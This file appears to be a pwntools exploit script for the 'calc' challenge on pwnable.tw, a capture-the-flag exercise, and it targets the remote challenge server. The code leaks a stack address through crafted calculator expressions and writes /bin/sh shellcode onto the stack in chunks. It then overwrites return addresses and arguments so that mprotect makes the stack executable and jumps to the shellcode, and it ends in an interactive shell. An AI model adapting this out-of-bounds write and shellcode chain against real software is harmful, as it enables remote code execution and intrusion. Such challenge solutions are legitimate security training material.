#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import time

# Set up pwntools for the correct architecture
context.update(arch='i386')
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
exe = './calc'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#get_expr() call
#break *calc+59
#parse_expr() call
#break *calc+116
#printf() call
#break *calc+152
#break *calc+125
#break *calc+186
#break *eval
#break *0x080493b9

#stack executable
#break *0x0809b9e0

#mprotect
#break *0806f1f0
break *mprotect
break *mprotect+24

#malloc()
#break *parse_expr+157
##memcpy()
##break *parse_expr+119
#break *parse_expr+188
##atoi()
#break *parse_expr+268
##idx = *pool
#break *parse_expr+288
#break *parse_expr+366
#exp_ptr = p_exp + itr + 1
#break *parse_expr+381
#switch statement
#break *parse_expr+512
#eval()
#break *parse_expr+729
##operator == "+"
#break *eval+18
##eval epilogue
#break *eval+259

#watch *0xffffd620
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def calculate_next_val(prev, current):
    val = current - prev
    if abs(val) < 2147483647:
        print("first case")
        return val
    if val > 0:
        print('second case"')
        #val = -1 * ((4294967295 - current) + prev)
        val = -1 * ((4294967296 - current) + prev)
        return val
    elif val < 0:
        print("third case")
        val = ((2147483647 - prev) + current)
        #val = ((2147483648 - prev) + current)
        return val

elf = ELF(exe)

#io = start()
io = remote('chall.pwnable.tw','10100')
print(io.recv())

#Leak Pool Value
io.sendline('-5+1')
pool = int(io.recv())-1
#pool = p32(int(io.recv())-1,sign="signed")
print(f'Pool address: {p32(pool,sign="signed")[::-1]}')
pool = u32(p32(pool,sign="signed"))
#print(pool)

#Write shellcode
shellcode = asm(shellcraft.sh())
shellcode = [shellcode[i:i+4] for i in range(0, len(shellcode), 4)]
#addr = pool - 131192 #stack_base
stack_offset = 131192

print("Seeding shellcode")
prev_elem = 0
for idx,elem in enumerate(shellcode):
    current_elem = u32(elem)
    val = calculate_next_val(abs(prev_elem), current_elem)
    prev_elem = val
    print(val)
    #if val == -2088546109:
    #    val = val-1
    if val > 0:
        val = f'+{val}'
    elif val < 0:
        val = f'{val}'
    #print(f'-{int(stack_offset/4)-idx}+{u32(elem)}')
    offset = int(stack_offset/4)-idx
    print(f'-{offset}{val}')
    io.sendline(f'-{offset}{val}')
    io.recv()

print("Setting up mprotect")
#Setup mprotect + jump to shellcode
#Overwrite ret with mprotect
mprotect = elf.sym.mprotect
old_ret1 = 0x8049499
offset = mprotect - old_ret1
print(f'+361+{offset}')
io.sendline(f'+361+{offset}')

#Overwrite 2nd ret with shellcode location 
print(offset, pool-stack_offset-1)
#val = calculate_next_val(offset, pool-stack_offset-1)
val = calculate_next_val(offset, pool-stack_offset)
if val > 0:
    val = f'+{val}'
elif val < 0:
    val = f'{val}'
print(f'+362{val}')
io.sendline(f'+362{val}')

#Overwrite param1 with aligned page

mprotect_addr = pool-stack_offset
while (hex(mprotect_addr)[-3:] != '000'):
    mprotect_addr -= 1

val = calculate_next_val(abs(int(val)), mprotect_addr)
if val > 0:
    val = f'+{val}'
elif val < 0:
    val = f'{val}'
print(f'+363{val}')
io.sendline(f'+363{val}')

#Overwrite param2 with 0x100
print(int(val), 0x100)
val = calculate_next_val(abs(int(val)), 0x100)
if val > 0:
    val = f'+{val}'
elif val < 0:
    val = f'{val}'
print(f'+364{val}')
io.sendline(f'+364{val}')

#Overwrite param3 with 0x4
print(int(val),0x4)
val = calculate_next_val(abs(int(val)), 0x4)
if val > 0:
    val = f'+{val}'
elif val < 0:
    val = f'{val}'
#io.sendline(f'+365{val}')
print(f'+365{val}')
io.sendline(f'+365{val}')



#Trigger exploit



# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

